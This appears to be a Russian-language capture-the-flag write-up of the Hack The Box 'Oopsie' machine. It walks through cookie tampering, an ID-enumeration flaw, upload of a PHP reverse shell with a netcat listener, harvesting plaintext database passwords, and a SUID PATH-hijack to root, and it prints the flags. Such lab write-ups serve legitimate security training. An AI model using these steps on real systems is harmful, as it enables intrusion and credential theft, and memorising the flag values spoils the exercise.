*** OOPSIE  

	### Introdution

	- Всякий раз, когда вы выполняете веб-оценку, включающую механизмы 
	аутентификации, всегда рекомендуется проверять файлы cookie, сеансы и 
	пытаться выяснить, как на самом деле работает контроль доступа. Во многих 
	случаях атака с удаленным выполнением кода и плацдарм в системе могут быть 
	недостижимы сами по себе, а скорее после объединения различных типов
	уязвимостей и эксплойтов. В этой вставке мы узнаем, что уязвимости типа 
	«Раскрытие информации» и «Нарушенный контроль доступа», даже если они 
	кажутся не очень важными, могут иметь большое влияние при атаке на систему, 
	и, следовательно, почему даже небольшие уязвимости имеют значение.

	### Enumeration

		- Разведка: поиск открытых портов
			
			@ nmap -sC -sV 10.129.149.69 
				
				22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
				80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

			
		- Мы посещаем IP с помощью веб-браузера, где мы видим веб-сайт для
		автомобилей 
			
			http://10.129.149.69 

		- На главной странице можно найти интересную информацию о том, как
		можно получить доступ к услугам через вход: 
			
			Please login to get access to the service 

		- Согласно этой информации, на сайте должна быть страница входа. Прежде 
		чем мы приступим к перечислению каталогов и страниц, мы можем попытаться 
		сопоставить веб-сайт с помощью прокси-сервера Burp Suite для пассивного 
		сканирования веб-сайта. Burp Suite — это мощное приложение для 
		тестирования безопасности, которое можно использовать для выполнения 
		веб-запросов в веб-приложениях, мобильных приложениях и толстых клиентах. 
		Burp предлагает множество возможностей, таких как поисковый робот, 
		сканер, прокси-сервер, повторитель, взломщик и многие други

		- Поисковый робот (также известный как веб-паук или веб-робот) — это 
		программа или автоматизированный скрипт, который методично и 
		автоматически просматривает всемирную паутину. Этот процесс называется 
		веб- сканированием или поиском пауков. Многие законные сайты, в частности 
		поисковые системы, используют поисковые роботы как средство 
		предоставления актуальных данных

		- Если вы туннелируете веб-трафик через Burp Suite (без перехвата 
		пакетов), по умолчанию он может пассивно сканировать веб-сайт, обновлять 
		карту сайта со всем запрошенным содержимым и, таким образом, создавать 
		дерево файлов и каталогов без отправки каких-либо дополнительных запросов

		

	### INSTALL BURPSUITE 
		
		git clone https://aur.archlinux.org/burpsuite.git 
		sudo pacman -S java-runtime # установить недостающую библиотеку  
			
			choose extra 

		cd burpsuite
		makepkg -c -s  # начать сборку 
			
			-c удалить временные файлы после сборки  
			-s проверить зависимости 

			burpsuite-2022.3.7-1-any.pkg.tar.zst

		pacman -U burpsuite-2022.3.7-1-any.pkg.tar.zst # установить пакет 

	
	### FAQ WEB PROXIES 
		
		- Для дальнейшего чтения и более глубокого анализа использования 
		веб-прокси и инструментов, таких как пакет Burp, можно найти в 
		модуле академии HTB:
			
			https://academy.hackthebox.eu/course/preview/using-web-proxies


		### BEGIN 
			
		- Сначала мы запустим Burp Suite и настроим браузер для отрправки
		трафика через прокси. Чтобы получить доступ к настройкам прокси в
		Mozzila Firefox, вы можете щелкнуть меню Firefox и перейти к
		настройкам:
			
			Go to PREFERENCES -> SEARCH FIELD -> FIND 'PROXY'
				
				-> NETWORK SETTINGS # end point

		- Затем мы выбираем Ручная настройка прокси, где мы вводим в качестве
		HTTP-прокси, где прослушивается Burp Proxy
		
			Manual proxy configuration	
			ip 127.0.0.1  port 8080 
			
			... (Примечение) Также можно использовать этот прокси для
			FTP and HTTPS, так что все запросы могут проходить через Burp

		- Нам нужно отключить перехват в пакете Burp, так как он включен 
		по умолчанию
			
			1) Перейти во вкладку Proxy Tab (вкладка прокси)

			2) Раздел Intercept (перехват)

			3) Выбрать кнопку Intercept in  # должен находится в состоянии off

			4) Затем отключить его

		
	### ANALISIES {TARGET_IP} BurpSuite
		
		- Теперь когда все настроено правильно, мы обновляем страницу в нашем
		браузере и переключаемся в Burp Suite на вкладке "Target", а затем в 
		опции "Site map" 

			http://target_ip
				
				cdn-cgi
					-login
				 		-script.js
					-scripts
				css
				fonts
				js
				themes

		- Можно обнаружить некоторые каталоги и файлы, которые не были видны
		во время просмотра. Тот, который действительно очень интересен, это
		каталог: 
			
			/cdn-cgi/login 

			- Мы можем посетить его в браузере, и действительно нам представлена
			страница входа: http://{target_ip}/cdn-cgi/login 

		- Попробовав пару комбинаций имени пользователя и пароля по умолчанию,
		нам не удалось получить доступ, Но есть и вариант Войти как гость
			
			Login as Guest 

		- Пробуем и теперь нам представлена пара новых параметров навигации,
		поскольку мы вошли в систему как 
			
			Guest

		- После навигации по доступным страницам мы замечаем, что единственная 
		интересная, кажется
			
			Uploads
			
			- Однако получить доступ к ней невозможно, так как нужно иметь 
			права супер-администратора
				
				This action require super admin rights 

	### INSPECT MOZILLA  	
	
		- Нам нужно найти способ повысить наши привилегии от Guest к 
		Super admin. Один из способов проверить это, проверив, можно ли 
		манипулировать файлами Cookie and Sessions
			
			Файлы Cookie - это текстовые файлы с небольшими фрагментами данных, 
			созданные веб-сервером, сохраненные браузером в файловой системе 
			компьютера и используемые для идентификации пользователя во время
			просмотра веб-сайта.
			
		- В Mozilla Firefox можно просматривать и изменять файлы cookie с
		помощью инструментов разработчика 

			
			Инструменты разработчика — это набор инструментов веб-разработчика, 
			встроенных в Firefox. Вы можете использовать их для изучения, 
			редактирования и отладки HTML, CSS и JavaScript.

		- Чтобы войти в панель инструментов разработчика, нам нужно щелкнуть
		правой кнопкой мыши содержимое веб-страницы и выбрать
			
			Inspect (Q): Осмотреть элемент

		- Затем мы можем перейти к STORAGE, раздел в котором представленны
		файлы COOKIE.
			
			INSPECT -> STOTAGE -> COOKIE 
				
				NAME		VALUE
				role		guest
				user		2233

		- Мы можем предположить, что если бы каким-то бразом знать VALUE
		для super admin в поле USER, то могли бы получить доступ к странице
		Uploads
			
			go to the url: 
			http://10.129.46.22/cdn-cgi/login/admin.php?content=accounts&id=2

		- Пробуем изменить переменную id на другое значение, например 1, чтобы
		увидеть возможно ли перечислить пользователей 
			
			edit url to:
			http://10.129.46.22/cdn-cgi/login/admin.php?content=accounts&id=1

		- Действительно, у нас есть уязвимость раскрытия иноформации, которой
		мы могли бы злоупотребить. Теперь известно что идентификатор доступа
		
			Access ID		Name		Email
			34322			admin		admin@megacorp.com

		- Поэтому мы можем изменить файлы Cookie при помощи инструментов
		разроботичка (INSPECT)
			
			
			INSPECT -> STOTAGE -> COOKIE 
				
				NAME		VALUE
				role		admin
				user		34322

		- Возвращаемся к странице Uploads
			
			http://10.129.46.22/cdn-cgi/login/admin.php?content=uploads
			
			!!! ВУАЛЯ 
				
				- появляется поле ввода BRAND NAME
				
				- баттон BROWSE 
				
				- баттон Upload

		- Теперь когда у нас есть доступ к форме загрузки, мы можем поптытаться
		загрузить нашу обратную оболочку PHP (PHP reverse shell). Вместо
		собственной формы будем использовать существующую: 
			
			# In PARROT OS, вебшеллы можно найти в папке 
				
				/usr/share/webshells/

			# Также можно скачать здесь 
				
				https://github.com/BlackArch/webshells 

				webshells/php/php-reverse-shell.php  # путь к обратной оболочке

		- Конечно нужно изменить код приведенный в php-reverse-shell.php
		чтобы он соответствовал определенным требованиям. Мы собираемся 
		изменить переменные в соответствии с нашими настройками, а затем мы 
		попытаемся загрузить файл
			
			ifconfig tun0
				
				inet 10.10.15.39 

			$ip = 'MY MACHINE IP'
			$port = 'MY LISTENING PORT'
			
			# загрузить измененный файл custom-php-reverse-shell.php 
			через форму на странице Uploads:
				
			1) Browse directory_with_file/'custom-php-reverse-shell.php' 
			
			2) Upload 
				
				The file custom-php-reverse-shell.php has been uploaded.
		
		- Наконец-то нам удалось его загрузить. Теперь нам может понадобиться
		брутофорс каталогов, чтобы найти папку, в которой хранятся загруженные
		файлы, но мы также можем догадаться о тот, что директория находится
		по данному URL:
			
			http://{target_ip}/uploads 

		- Для того чтобы убедиться в этом используем GOBUSTER    
		
			gobuster dir -url http://10.129.46.22/ \
			--wordlist SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
				
				/uploads              (Status: 301) [Size: 314] [--> http://10.129.46.22/uploads/]	

		- Gobuster сразу нашел /uploads каталог. У нас нет разрещения на доступ
		к каталогу, но мы можем попробовать получить доступ к нашему загруженному
		файлу
			
			http://{target_ip}/uploads 
				
			Forbidden (Запрещенно)
			You don't have permission to access this resource
		
		- Для начала необходимо запустить NETCAT с на порт REVERSE-SHELL
			
			sudo nc -lvnp 1234
				
		- Затем запросим нашу оболочку через браузер
			
			http://{TARGET_IP}/uploads/custom-php-reverse-shell.php
				

			... (Примечание) Если нашей оболочки нет, возможно, она была удалена, 
			поэтому нам нужно загрузить ее снова.
			
			WARNING: Failed to daemonise. This is quite common and not fatal. 
			Connection refused (111)

		- Проверяем слушатель (NETCAT)
			
			### MY MACHINE 
			
			@sudo nc -lvnp 1234 

				Connection from 10.129.46.22:52640
				Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
				21:50:39 up  2:01,  0 users,  load average: 0.07, 0.02, 0.00
				USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
				uid=33(www-data) gid=33(www-data) groups=33(www-data)
				/bin/sh: 0: can't access tty; job control turned off

				@ whoami
					
					www-data
					# У нас получилась обратная оболочка! Чтобы иметь
					функциональную оболочку, мы можем сделать следующее
				
				@ python -c 'import pty;pty.spawn("/bin/bash")' 


	### Lateral Movement
	Боковое движение
		
		- Как пользователь www-data мы не можем добиться многого, поскольку роль 
		имеет ограниченный доступ в системе. Поскольку веб-сайт использует
		PHP & SQL, мы можем дополнительно перечислить веб-каталог ддя
		потенциального раскрытия информации, или неправильные конфигурации.
		После некоторого поиска мы можем найти несколько интересных файлов php
		в разделе
			
			/var/www/html/cdn-cgi/login 

		- Мы можем вручную посмотреть исходный код всех страниц или попытаться 
		найти интересные строки с использованием GREP 
			
			GREP - это инструмент, который ищет ШАБЛОНЫ в каждом файле и 
			напечатать строки, соответствующие образцам. 


		- Мы можем использовать CAT *
			
			CAT * - читать все файлы при передаче вывода в GREP 

		- В GREP мы предоставляем шаблон строки, которая начинается со слова 
		например 
			
			# passw сопровождаемая любой строкой, например, для слова passwd или
			password 

		- Мы также можем использовать пернеключатель -i игнорирования регистра
			
			### TARGET HOST
				
				@ python -c 'import pty;pty.spawn("/bin/bash")' 
					
				@ cd /var/www/html/cdn-cgi/login

				@ cat * | grep -i passw* 
					
					if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
					<input type="password" name="password" placeholder="Password" />

		- Мы действительно получили MEGACORP_4dm!n!!. Мы можем проверить
		доступных пользователей в системе с помощью  CAT
			
			@ cat /etc/passwd # из обилия системных служб, сервисов и пользователя
							  root, удается найти пользователя robert

				robert:x:1000:1000:robert:/home/robert:/bin/bash
		
		- Был найден пользователь robert, чтобы войти в систему как этот
		пользователь используем команду SU
			
			@ su robert 
			Password: MEGACORP_4dm1n!!
				
				su: Authentication failure

		- К сожалению, не был пароль для пользователя robert. Теперь прочитаем
		файлы один за другим 
			
			@ ls 
				
				admin.php  db.php  index.php  script.js

			@ cat db.php
				
				<?php
				$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
				?>

			@ 

		- Теперь когда мы нашли пароль, можем успешно войти в систему и найти
		USER.txt флаг, который можно прочитать в домашнем каталоге 

			@su robert
			Password: M3g4C0rpUs3r!
				
			robert@oopsie  cd ~/ # перейти в домашний каталог 
			robert@oopsie  ls 
				
				user.txt

			robert@oopsie  cat user.txt
				
				f2c74ee8db7983851ab2a96a44eb7981

	
	### Privilege Escalation
	Повышение привилегий 
		
		- Прежде чем запускать какой-либо сценарий повышения привилегий или
		перечисления, можно проверить основные команды статистики привилегий
			
			@ sudo -l # узнать если запись о пользователе в файле SUDOERS
				
				Sorry, user robert may not run sudo on oopsie.

			@ id
				
				uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

		- Мы наблюдаем, что robert является членом группы bugtracker. Есть смысл
		проверить есть ли какой-либо бинарный файл используемыый этой группой
			
			@ find / -group bugtracker 2>/dev/null 
				
				/usr/bin/bugtracker

		- Найден файл с именем bugtracker. Проверяем какие имеются привилегии
		и какой тип файла 
			
			ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
			-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
			/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, 
			version 1 (SYSV), dynamically linked, interpreter /lib64/l, for 
			GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, 
			not stripped

			# Найден флаг SetUID, это значит его можно исполнять от имени 
			суперпользователя 
				
				реальный ID : user_id 
				эффективный UD: root_id

		- Существует SETUID установленный для этого файла, что является 
		многообещающим путем эксплуатации 
			
			Обычно обозначаемое как SUID (Set owner User ID), специальное 
			разрешение для уровня доступа пользователя имеет единственную 
			функцию: файл с SUID всегда выполняется от имени пользователя, 
			которому принадлежит файл, независимо от того, кто передал команду. 
			Если у владельца файла нет прав на выполнение, используйте здесь S в 
			верхнем регистре.

			... (ПРИМЕЧАНИЕ) В нашем случае бинарный «багтрекер» принадлежит 
			пользователю root, и мы можем запустить его от имени пользователя 
			root, поскольку для него установлен SUID. 

			rwsr # флаг s в нижнем регистре означает права root 

		- Запустим приложение, чтобы узнать как оно себя ведет: 
			
			@ /usr/bin/bugtracker # or SIMPLE:
			@ bugtracker 
				
				------------------
				: EV Bug Tracker :
				------------------

				Provide Bug ID: 12
				12
				------------------

				cat: /root/reports/12: No such file or directory

		- Мы запустим приложение, чтобы посмотреть, как оно себя ведет:
		Инструмент принимает пользовательский ввод в качестве имени файла, 
		который будет прочитан с помощью команды cat, однако он не указывает 
		полный путь к файлу cat, поэтому мы можем использовать это. 
			
		- Перейдем к каталогу /tmp и создадим файл с именем со следующим 
		содержанием 
				
			/bin/sh 
			
			@ cd /tmp
			@ touch cat
			@ echo "/bin/bash" > cat  

		- Затем установим привилегии выполнения 

			@ chmod +x cat 

		- Чтобы воспользоваться этим, мы можем добавить каталог /tmp в 
		переменную окружения PATH.

			PATH — это переменная среды в Unix-подобных операционных системах, 
			DOS, OS/2 и Microsoft Windows, указывающая набор каталогов, в 
			которых находятся исполняемые программы.

		- Мы можем сделать это, введя следующую команду:
			
			@ export PATH=/tmp:$PATH

		- Проверям PATH 
			
			@ echo $PATH
				
				/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

		- Выполняем BUGTRACKER из каталога /tnp
			
			robert@oopsie:/tmp$ bugtracker 
				
				------------------
				: EV Bug Tracker :
				------------------

				Provide Bug ID: 2
				2
				------------------

			# whoami
				
				root

			# cd /root/
			
			# ls 

				reports  root.txt 

			# cat root.txt 
				
				# так как это имя заменено на выполнение /bin/sh 
				содержимое файла через cat посмотреть не получится. Можно 
				использовать другие утилиты такие как VIM NANO less more и т.д

				
			# less root.txt 
				
				WARNING: terminal is not fully functional
				root.txt  (press RETURN) Enter

					af13b0bee69f8a877c3faf667f7beacf

			









